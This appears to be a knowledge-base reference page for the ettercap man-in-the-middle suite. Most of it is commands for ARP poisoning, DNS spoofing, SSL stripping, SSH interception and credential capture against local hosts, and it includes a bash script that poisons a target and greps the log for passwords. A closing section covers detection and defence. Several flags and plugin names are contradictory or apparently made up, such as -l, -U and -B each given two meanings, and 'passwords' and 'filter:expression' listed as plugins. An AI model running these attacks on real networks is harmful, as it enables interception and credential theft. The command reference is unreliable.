---
title: "ettercap - Comprehensive MITM Attack Suite"
description: "Feature-rich man-in-the-middle attack suite for ARP poisoning, DNS spoofing, and protocol dissection on local area networks"
mitre_tactic: discovery
mitre_tactic_id: TA0007
mitre_subcategory: network_sniffing
categories:
  - man-in-the-middle
  - network-security
  - arp-poisoning
  - dns-spoofing
  - packet-analysis
tags:
  - ettercap
  - mitm
  - arp-poisoning
  - dns-spoofing
  - packet-dissection
  - plugin-system
install_command: "sudo apt install ettercap-graphical"
version: "0.8.3.1"
github_repo: "https://github.com/Ettercap/ettercap"
kali_tools_page: "https://www.kali.org/tools/ettercap/"
difficulty_level: intermediate
requires_root: true
gui_available: true
related_tools:
  - bettercap
  - arpspoof
  - wireshark
  - tcpdump
  - mitmproxy
---

# ettercap - Comprehensive MITM Attack Suite

## 1. Introduction

ettercap is a comprehensive suite for man-in-the-middle attacks on LAN networks. It features ARP poisoning, DNS spoofing, SSH/HTTPS interception, and a powerful plugin and dissector system. ettercap supports both command-line and graphical interfaces, making it versatile for various penetration testing scenarios.

**Primary Use Cases:**
- ARP poisoning and man-in-the-middle attacks
- DNS spoofing and hijacking
- SSL/HTTPS interception with certificate spoofing
- Password sniffing and credential capture
- Protocol dissection and analysis
- Network enumeration and host discovery
- Content filtering and manipulation

**Key Features:**
- **ARP Poisoning**: Redirect traffic between two hosts
- **DNS Spoofing**: Hijack DNS queries
- **SSL MITM**: Intercept encrypted connections
- **Plugin System**: Extensible functionality
- **Protocol Dissectors**: Deep packet inspection
- **IPv6 Support**: Modern network compatibility
- **Graphical Interface**: Visual attack management

**Attack Modes:**
- **Unified Sniffing**: Standard sniffing mode
- **Bridged Sniffing**: Bridge between two interfaces
- **ARP-based MITM**: ARP poisoning attacks
- **IP-based MITM**: Direct IP routing manipulation

## 2. Installation

### Standard Installation

```bash
# Install ettercap with graphical interface
sudo apt update
sudo apt install ettercap-graphical

# Install text-only version (smaller footprint)
sudo apt install ettercap-text-only

# Verify installation
ettercap -v
```

### Installation from Source

```bash
# Install dependencies
sudo apt install cmake build-essential libgtk-3-dev libpcap-dev libnet-dev \
  libcurl4-openssl-dev libssh-dev libssl-dev libncurses5-dev libltdl-dev \
  ghostscript gpsd gpsd-clients

# Clone repository
git clone https://github.com/Ettercap/ettercap.git
cd ettercap

# Build and install
mkdir build && cd build
cmake -DCMAKE_INSTALL_PREFIX=/usr ..
make
sudo make install
```

### Post-Installation Setup

```bash
# Update ettercap plugins
sudo ettercap -U

# Verify plugin directory
ls -la /usr/share/ettercap/

# Check dissectors
ettercap -V | grep -i dissector
```

## 3. Core Concepts

### ARP Poisoning

ARP poisoning is ettercap's primary attack vector. The tool sends forged ARP replies to poison the ARP caches of target machines, redirecting traffic through the attacker.

**Attack Mechanism:**
1. Host discovery on the network
2. Target selection (single host or range)
3. ARP cache poisoning
4. Traffic interception and analysis
5. Credential extraction and session hijacking

### DNS Spoofing

ettercap can spoof DNS responses, redirecting victims to malicious servers:
- Redirect HTTP traffic to attacker-controlled servers
- Phishing attacks via DNS manipulation
- Bypass SSL certificates with appropriate plugins

### SSL Interception

ettercap can perform SSL/TLS MITM attacks:
- Generate fake certificates on-the-fly
- Redirect HTTPS to HTTP for credential capture
- Use with SSLstrip for downgrading connections

### Protocol Dissectors

ettercap includes dissectors for 100+ protocols:
- **Application Layer**: HTTP, FTP, SSH, Telnet, SMTP, POP3, IMAP, DNS
- **Database**: MySQL, PostgreSQL, MSSQL
- **VoIP**: SIP, RTP, IAX2
- **Authentication**: LDAP, Kerberos, RADIUS

## 4. Command Reference

### General Options

```bash
# Basic syntax
ettercap [options] [target1] [target2]

# Interface selection
-i <interface>          # Specify network interface

# Mode selection
-G                      # Graphical mode (GTK)
-T                      # Text-only mode
-Tq                     # Quiet text mode

# Target specification
-t <target>             # Single target IP
-m <target>             # MAC address target
```

### Sniffing Options

```bash
# Unified sniffing (default)
-U                      # Unified sniffing mode

# Bridged sniffing
-B <interface>          # Bridge interface for bridged sniffing

# ARP-based MITM
-M arp:remote           # ARP poisoning MITM
```

### Output Options

```bash
# Write to file
-w <filename>           # Write packets to pcap file
-L <filename>           # Write log to file
-l <filename>           # Write local log file

# Verbose output
-v                      # Verbose mode
-q                      # Quiet mode
```

### Target Specification

```bash
# Single target
ettercap -T -i eth0 /192.168.1.100//

# Target range
ettercap -T -i eth0 /192.168.1.1-100//

# Target with MAC
ettercap -T -i eth0 //00:11:22:33:44:55//

# Exclude target
ettercap -T -i eth0 /192.168.1.100/ !/192.168.1.1/
```

### MITM Options

```bash
# ARP poisoning
-M arp:remote           # Remote ARP poisoning
-M arp                  # Local ARP poisoning

# ICMP poisoning
-M icmp                 # ICMP redirect

# DHCP spoofing
-M dhcp:spoof           # DHCP spoofing

# Port stealing
-M port:steal           # Port stealing
```

### Plugin Options

```bash
# Load plugin
-P <plugin>             # Load specific plugin

# List plugins
-l                      # List available plugins

# Run plugin
-P <plugin> -plugin_cmd <args>
```

### Script Options

```bash
# Load Lua script
-S <script>             # Load Lua script
--lua-scripts <dir>     # Lua scripts directory
```

## 5. Examples

### Basic Examples

```bash
# Start graphical mode
sudo ettercap -G

# Start text mode
sudo ettercap -T

# ARP poison target
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

# DNS spoofing
sudo ettercap -T -i eth0 -M arp:remote -P dns_spoof /192.168.1.100//

# Capture to file
sudo ettercap -T -i eth0 -w capture.pcap -M arp:remote /192.168.1.100//
```

### Intermediate Examples

```bash
# Full MITM with credential capture
sudo ettercap -T -i eth0 -M arp:remote \
  -P dissectors \
  -P passwords \
  -P remote_browser \
  /192.168.1.100// /192.168.1.1//

# SSL stripping attack
sudo ettercap -T -i eth0 -M arp:remote \
  -P sslstrip \
  /192.168.1.100// /192.168.1.1//

# DNS spoofing with custom hosts file
sudo ettercap -T -i eth0 -M arp:remote \
  -P dns_spoof \
  -P host_header \
  /192.168.1.100// /192.168.1.1//

# SSH interception
sudo ettercap -T -i eth0 -M arp:remote \
  -P sshmitm \
  /192.168.1.100// /192.168.1.1//
```

### Advanced Examples

```bash
# Complete attack script
#!/bin/bash
# MITM Attack Automation

INTERFACE="eth0"
TARGET="192.168.1.100"
GATEWAY="192.168.1.1"
LOG_FILE="/tmp/ettercap_$(date +%Y%m%d_%H%M%S).log"

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start ettercap in background
ettercap -T -i $INTERFACE \
  -M arp:remote \
  -P dissectors \
  -P passwords \
  -P remote_browser \
  -L $LOG_FILE \
  /$TARGET// /$GATEWAY// &

ETTERCAP_PID=$!

# Monitor for credentials
tail -f $LOG_FILE | grep -i "password\|user\|login"

# Cleanup on exit
trap "kill $ETTERCAP_PID; echo 0 > /proc/sys/net/ipv4/ip_forward; exit" SIGINT
wait
```

### Real-World Scenarios

```bash
# Corporate network audit
sudo ettercap -T -i eth0 -M arp:remote \
  -P dissectors \
  -L corporate_audit.log \
  /192.168.1.0/24//

# Web application testing
sudo ettercap -T -i eth0 -M arp:remote \
  -P remote_browser \
  -P https_catcher \
  /192.168.1.100// /192.168.1.1//

# VoIP monitoring
sudo ettercap -T -i eth0 -M arp:remote \
  -P voip \
  /192.168.1.100// /192.168.1.1//

# Database credential capture
sudo ettercap -T -i eth0 -M arp:remote \
  -P mysql_dissector \
  -P postgres_dissector \
  /192.168.1.100// /192.168.1.1//
```

## 6. Advanced Usage

### Custom Plugins

```bash
# Create custom plugin directory
mkdir -p ~/ettercap_plugins

# List available plugins
ettercap -l

# Load multiple plugins
sudo ettercap -T -i eth0 \
  -P dissectors \
  -P passwords \
  -P remote_browser \
  -P filter \
  /192.168.1.100//
```

### Lua Scripting

```lua
-- custom_filter.lua
-- Custom ettercap Lua script

function on_packet(pkt)
    -- Analyze packet
    if pkt.proto == "TCP" and pkt.dport == 80 then
        -- Log HTTP traffic
        print("HTTP traffic detected: " .. pkt.src_ip .. " -> " .. pkt.dst_ip)
    end
end
```

```bash
# Run custom Lua script
sudo ettercap -T -i eth0 -S custom_filter.lua
```

### Integration with Other Tools

```bash
# Pipe to Wireshark
sudo ettercap -T -i eth0 -w - | wireshark -k -

# Log to file for analysis
sudo ettercap -T -i eth0 -L attack.log

# Process logs with grep
grep -i "password" attack.log

# Use with tmux
tmux new-session -d -s ettercap 'sudo ettercap -T -i eth0'
```

### Advanced Filtering

```bash
# Filter by protocol
sudo ettercap -T -i eth0 -M arp:remote \
  -P filter:expression="tcp port 80" \
  /192.168.1.100//

# Filter by content
sudo ettercap -T -i eth0 -M arp:remote \
  -P filter:expression="content 'password'" \
  /192.168.1.100//
```

## 7. Detection & Defense

### Detection Methods

**ARP Table Monitoring:**
```bash
# Check for duplicate MAC addresses
arp -a | awk '{print $2, $4}' | sort | uniq -d

# Monitor ARP changes
watch -n 2 'arp -a'

# Use arpwatch
sudo apt install arpwatch
sudo systemctl enable arpwatch
```

**Network Analysis:**
```bash
# Detect ARP spoofing
sudo tcpdump -i eth0 arp -n

# Monitor for duplicate IPs
sudo arp-scan -l

# Check for certificate changes
openssl s_client -connect example.com:443
```

**IDS Signatures:**
- Snort rules for ARP spoofing
- Suricata rules for MITM detection
- Zeek scripts for certificate anomalies

### Defense Strategies

**Static ARP Configuration:**
```bash
# Add static ARP entry
sudo arp -s 192.168.1.1 00:11:22:33:44:55

# Persist static ARP
sudo nano /etc/ethers
```

**Network Security:**
- Implement Dynamic ARP Inspection (DAI)
- Use 802.1X network access control
- Deploy certificate pinning
- Enable HSTS on web servers

**Host-Based Protection:**
```bash
# Install ARP monitoring
sudo apt install arpsniff

# Enable anti-ARP tools
sudo apt install arpon

# Configure static ARP entries
sudo nano /etc/network/if-pre-up.d/arp-static
```

**Encryption:**
- Use end-to-end encryption
- Implement VPN for sensitive traffic
- Use certificate transparency
- Enable OCSP stapling

## 8. Troubleshooting & FAQ

### Common Issues

**"No such device" Error:**
```bash
# List interfaces
ip link show

# Check interface status
sudo ip link set eth0 up

# Enable promiscuous mode
sudo ip link set eth0 promisc on
```

**"Permission Denied" Error:**
```bash
# Run with sudo
sudo ettercap -T

# Check capabilities
sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/ettercap
```

**Plugins Not Loading:**
```bash
# Check plugin directory
ls -la /usr/share/ettercap/plugins/

# Update plugins
sudo ettercap -U

# Check plugin permissions
sudo chmod 644 /usr/share/ettercap/plugins/*.so
```

**ARP Poisoning Not Working:**
```bash
# Verify IP forwarding
cat /proc/sys/net/ipv4/ip_forward

# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Check ARP table
arp -a | grep target
```

### Performance Issues

**High CPU Usage:**
```bash
# Reduce capture scope
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100//

# Disable unnecessary dissectors
sudo ettercap -T -i eth0 -M arp:remote -P passwords

# Use specific filters
sudo ettercap -T -i eth0 -M arp:remote -P filter:expression="tcp port 80"
```

**Packet Loss:**
```bash
# Increase buffer size
sudo ettercap -T -i eth0 -B 4096

# Use faster interface
sudo ettercap -T -i eth1

# Reduce system load
sudo systemctl stop [unnecessary-services]
```

### FAQ

**Q: Does ettercap work on switched networks?**
A: Yes, when combined with ARP poisoning. The tool redirects traffic through the attacker.

**Q: Can ettercap intercept HTTPS traffic?**
A: Yes, with SSL MITM plugins. ettercap can generate fake certificates and intercept encrypted traffic.

**Q: Is ettercap legal to use?**
A: Only on networks you own or have explicit authorization to test. Unauthorized use is illegal.

**Q: How does ettercap differ from arpspoof?**
A: ettercap is a comprehensive suite with plugins, dissectors, and GUI, while arpspoof is a focused ARP poisoning tool.

**Q: Can ettercap capture VPN traffic?**
A: No, VPN traffic is encrypted end-to-end. ettercap can only capture the encrypted packets.

**Q: Does ettercap support IPv6?**
A: Yes, ettercap has IPv6 support for ARP and ICMPv6-based MITM attacks.

## Resources

### Official Documentation
- [ettercap Manual Page](https://linux.die.net/man/8/ettercap)
- [ettercap GitHub Repository](https://github.com/Ettercap/ettercap)
- [ettercap Documentation](https://ettercap.github.io/ettercap/)

### Tutorials and Guides
- [ettercap MITM Tutorial](https://www.youtube.com/watch?v=QaJjJmMmKqQ)
- [ARP Spoofing with ettercap](https://www.tutorialspoint.com/ettercap/index.htm)
- [ettercap SSL Interception](https://www.offensive-security.com)

### Related Tools
- **bettercap**: Modern MITM framework
- **arpspoof**: Standalone ARP spoofing
- **wireshark**: Protocol analyzer
- **mitmproxy**: HTTPS proxy for debugging

### Books and Resources
- *Network Security Assessment* by Chris McNab
- *Hacking: The Art of Exploitation* by Jon Erickson
- *The Web Application Hacker's Handbook* by Dafydd Stuttard

### Community
- [ettercap GitHub Issues](https://github.com/Ettercap/ettercap/issues)
- [Kali Linux Forums](https://forums.kali.org/)
- [Reddit r/netsec](https://www.reddit.com/r/netsec/)
